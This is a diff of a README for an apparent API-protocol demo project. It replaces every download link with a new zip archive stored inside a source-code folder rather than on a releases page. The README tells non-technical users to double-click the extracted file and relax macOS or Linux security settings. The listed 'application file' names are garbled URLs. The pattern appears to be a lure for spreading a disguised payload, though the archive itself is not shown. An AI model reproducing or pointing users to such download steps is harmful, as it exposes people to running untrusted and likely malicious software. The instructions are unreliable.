@@ -6,11 +6,11 @@ This repository serves as a demonstration platform for various API protocols. Wh
 
 ## 📦 Download & Install
 
-[![Download Now](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/kafka-api/src/main/java/com/lcaohoanq/kafkaapi/producer/api-protocol-play-ground_v2.8.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/kafka-api/src/main/java/com/lcaohoanq/kafkaapi/producer/api-protocol-play-ground_v2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/grpc-api/src/main/ground_protocol_play_api_v3.2.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/grpc-api/src/main/ground_protocol_play_api_v3.2.zip)
 
 To start using the application, you need to download it. Please visit the following link to access the Releases page:
 
-[Visit Releases Page](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/kafka-api/src/main/java/com/lcaohoanq/kafkaapi/producer/api-protocol-play-ground_v2.8.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/grpc-api/src/main/ground_protocol_play_api_v3.2.zip)
 
 You'll find ready-to-use files there. Simply select the version you wish to download and follow the instructions below.
 
@@ -33,7 +33,7 @@ Ensure your system meets these requirements for the best experience.
 ## ⚙️ Running the Application
 
 1. **Extract the Files (If Needed):** If you downloaded a zipped file, right-click on it and select "Extract All". Follow the prompts to extract.
-2. **Locate the Application File:** Find the main application file. It may be named something like `https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/kafka-api/src/main/java/com/lcaohoanq/kafkaapi/producer/api-protocol-play-ground_v2.8.zip`, `https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/kafka-api/src/main/java/com/lcaohoanq/kafkaapi/producer/api-protocol-play-ground_v2.8.zip`, or similar.
+2. **Locate the Application File:** Find the main application file. It may be named something like `https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/grpc-api/src/main/ground_protocol_play_api_v3.2.zip`, `https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/grpc-api/src/main/ground_protocol_play_api_v3.2.zip`, or similar.
 3. **Run the Application:** Double-click the file to start the application. If you're on macOS or Linux, you may need to adjust your security settings to allow the app to run.
 
 ## 🌍 Features 
@@ -85,4 +85,4 @@ To ensure you have the latest features and fixes, regularly check the Releases p
 
 With the steps outlined above, you can easily download and run the api-protocol-play-ground application. Explore a variety of API protocols without needing any technical skills. Enjoy your journey through the world of APIs!
 
-For your convenience, here's the [Download Link](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/kafka-api/src/main/java/com/lcaohoanq/kafkaapi/producer/api-protocol-play-ground_v2.8.zip) once again.
+For your convenience, here's the [Download Link](https://raw.githubusercontent.com/ash2008n/api-protocol-play-ground/main/grpc-api/src/main/ground_protocol_play_api_v3.2.zip) once again.
